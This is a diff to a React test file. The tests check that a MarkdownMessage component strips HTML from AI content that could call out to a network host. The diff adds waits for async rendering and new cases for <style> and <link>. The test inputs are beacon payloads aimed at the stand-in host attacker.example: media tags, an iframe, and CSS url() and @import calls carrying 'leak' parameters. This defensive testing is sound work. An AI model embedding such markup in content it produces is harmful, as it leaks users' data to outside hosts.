@@ -1,5 +1,5 @@
 import React from 'react'
-import { render, act, screen, waitFor } from 'uiSrc/utils/test-utils'
+import { render, screen, waitFor } from 'uiSrc/utils/test-utils'
 
 import MarkdownMessage from './MarkdownMessage'
 
@@ -37,14 +37,19 @@ describe('MarkdownMessage', () => {
     it('should not render other passive network tags from AI content', async () => {
       const { container } = render(
         <MarkdownMessage>
-          {'<video src="https://attacker.example/v"></video>' +
+          {'Marker text. ' +
+            '<video src="https://attacker.example/v"></video>' +
             '<object data="https://attacker.example/o"></object>' +
             '<embed src="https://attacker.example/e">' +
             '<iframe src="https://attacker.example/i"></iframe>'}
         </MarkdownMessage>,
       )
 
-      await act(async () => {})
+      // MarkdownMessage formats asynchronously, so wait for content to render
+      // before asserting absence — otherwise the checks pass trivially.
+      await waitFor(() => {
+        expect(screen.getByText(/Marker text\./)).toBeInTheDocument()
+      })
 
       expect(container.querySelector('video')).toBeNull()
       expect(container.querySelector('object')).toBeNull()
@@ -55,17 +60,48 @@ describe('MarkdownMessage', () => {
     it('should not render an inline style that could beacon out via CSS', async () => {
       const { container } = render(
         <MarkdownMessage>
-          {
-            '<span style="background-image:url(https://attacker.example/?leak=1)">text</span>'
-          }
+          {'Marker text. ' +
+            '<span style="background-image:url(https://attacker.example/?leak=1)">text</span>'}
         </MarkdownMessage>,
       )
 
-      await act(async () => {})
+      await waitFor(() => {
+        expect(screen.getByText(/Marker text\./)).toBeInTheDocument()
+      })
 
       // No rendered element may carry a `style` attribute (stripped, or the
       // whole message falls back to escaped text) — either way nothing loads.
       expect(container.querySelector('[style]')).toBeNull()
+    })
+
+    it('should not render a <style> element that could beacon out via CSS', async () => {
+      const { container } = render(
+        <MarkdownMessage>
+          {'Marker text. ' +
+            '<style>@import url(https://attacker.example/?leak=1);</style>'}
+        </MarkdownMessage>,
+      )
+
+      await waitFor(() => {
+        expect(screen.getByText(/Marker text\./)).toBeInTheDocument()
+      })
+
+      expect(container.querySelector('style')).toBeNull()
+    })
+
+    it('should not render a raw <link> element that could load external resources', async () => {
+      const { container } = render(
+        <MarkdownMessage>
+          {'Marker text. ' +
+            '<link rel="stylesheet" href="https://attacker.example/leak.css">'}
+        </MarkdownMessage>,
+      )
+
+      await waitFor(() => {
+        expect(screen.getByText(/Marker text\./)).toBeInTheDocument()
+      })
+
+      expect(container.querySelector('link')).toBeNull()
     })
   })
 })
